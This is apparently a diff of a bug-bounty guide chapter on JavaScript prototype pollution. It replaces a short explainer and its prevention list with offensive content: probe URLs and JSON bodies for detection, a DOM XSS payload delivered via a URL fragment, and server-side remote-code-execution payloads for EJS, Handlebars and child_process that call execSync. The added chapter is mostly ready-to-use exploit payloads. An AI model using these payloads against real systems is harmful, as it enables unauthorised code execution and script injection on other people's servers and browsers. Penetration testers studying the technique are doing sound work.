@@ -1,51 +1,94 @@
-# Prototype Pollution
+# Prototype Pollution: Client-Side DOM XSS & Server-Side RCE
 
-Prototype pollution is a JavaScript vulnerability where an attacker injects properties into Object.prototype.
+## Detection
 
-## How It Works
-```javascript
-// Vulnerable merge
-function merge(target, source) {
-    for (let key in source) {
-        if (isObject(source[key])) {
-            target[key] = merge(target[key] || {}, source[key]);
-        } else {
-            target[key] = source[key];
-        }
-    }
-    return target;
-}
-
-// Exploit
-merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
-// Now every object has isAdmin = true
+### Client-Side (Browser)
+```bash
+# URL parameter fuzzing
+https://target.com/page?__proto__[test]=polluted
+# Then check in console:
+Object.prototype.test === "polluted"
+# Or:
+({}).test === "polluted"
 ```
 
-## Attack Vectors
-- **JSON.parse** - {"__proto__": {"isAdmin": true}}
-- **Query strings** - ?__proto__[isAdmin]=true
-- **HTTP headers** - Cookie: __proto__=true
+### Server-Side (JSON Body)
+```http
+POST /api/update-profile HTTP/1.1
+Content-Type: application/json
 
-## Vulnerable Libraries
-- jQuery ($.extend with deep=true)
-- Lodash (_.merge, _.defaultsDeep)
-- Express (qs parser - fixed in later versions)
-- Mongoose (schema injection)
+{"__proto__":{"status":555},"name":"test"}
+```
+Check if error responses return `status:555` instead of expected codes.
 
-## Exploitation Chains
+## Client-Side Exploitation
+
+### Source Discovery
+Look for vulnerable merge/clone patterns in JS:
+```js
+// Unsafe merge
+$.extend(true, target, source);  // jQuery
+_.merge(target, source);          // Lodash
+Object.assign(target, source);    // Native (shallow)
+```
+
+### Gadget Hunting
+Search for patterns that read from undefined properties:
+```js
+// Gadgets that read from prototype chain
+element.innerHTML = options.template;
+document.write(config.html);
+eval(settings.callback);
+location.href = opts.redirectUrl;
+```
+
+### DOM XSS Chain
+```bash
+# 1. Pollute through URL
+https://target.com/app#__proto__[innerHTML]=<img src=x onerror=alert(document.domain)>
+
+# 2. App reads: container.innerHTML = config.innerHtml || 'default'
+# 3. config.innerHtml is undefined → reads from polluted prototype → XSS fires
+```
+
+## Server-Side Exploitation (Node.js RCE)
+
+### EJS Template Engine
+```http
+POST /api/settings
+{"__proto__":{"outputFunctionName":"x=process.mainModule.require('child_process').execSync('id').toString();s"}}
+```
+Then trigger any EJS template render → RCE.
+
+### Handlebars Engine
 ```json
-{"__proto__": {"isAdmin": true, "role": "admin"}}
-{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
-{"__proto__": {"authorized": true}}
+{"__proto__":{"type":"Program","body":[{"type":"MustacheStatement","path":{"type":"PathExpression","parts":["constructor"]},"params":[{"type":"PathExpression","parts":["process","mainModule","require","child_process","execSync"]}]}]}}
 ```
 
-## Prevention
-1. Use Map instead of Object for key-value storage
-2. Set prototype to null - Object.create(null)
-3. Use safe merge functions that reject __proto__
-4. Validate input keys - reject __proto__, constructor, prototype
-5. Use Object.freeze(Object.prototype)
+### child_process Module
+```json
+{"__proto__":{"shell":"/bin/bash","NODE_OPTIONS":"--eval=require('child_process').execSync('id')"}}
+```
 
----
+### Express Config Gadgets
+```json
+{"__proto__":{"status":555}}
+// Confirms pollution via observable status code change
+```
 
-> **Next**: [LLM / AI Security](17-llm-ai-security.md)
+## Tools
+
+```bash
+# PPScan - automated detection
+ppscan -u "https://target.com/?__proto__[test]=polluted"
+# Server-Side Prototype Pollution Scanner (Burp extension)
+# ppmap - prototype pollution scanner
+```
+
+## Reporting Notes
+
+Always chain prototype pollution to demonstrated impact:
+- Client-side: pollution-only = Medium. Polluted to XSS = High/Critical.
+- Server-side: pollution-only = Medium. Pollution to RCE = Critical.
+
+Show the chain: pollution source → gadget → sink execution.
